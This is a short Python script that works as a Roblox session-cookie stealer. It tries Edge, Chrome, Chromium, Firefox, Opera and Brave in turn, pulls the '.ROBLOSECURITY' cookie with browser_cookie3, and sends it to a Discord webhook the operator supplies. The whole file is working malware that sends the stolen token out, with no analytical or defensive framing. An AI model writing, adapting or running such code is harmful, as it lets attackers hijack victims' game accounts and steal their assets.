import browser_cookie3
from discord_webhook import *

def ROBLOSECURITY():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                return cookie.value
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                return cookie.value
    except:
        pass
    
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                return cookie.value
    except:
        pass

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                return cookie.value
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                return cookie.value
    except:
        pass

    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                return cookie.value
    except:
        pass
    
def webhook(cookie, webhook_url):
    wh = DiscordWebhook(url=webhook_url)
    emb = DiscordEmbed(title='ROBLOSECURITY', description=f'```{cookie}```')
    wh.add_embed(emb)
    wh.execute()

if __name__ == "__main__":
    webhook_url = input("[+] webhook: ")
    cookie = ROBLOSECURITY()
    webhook(cookie, webhook_url)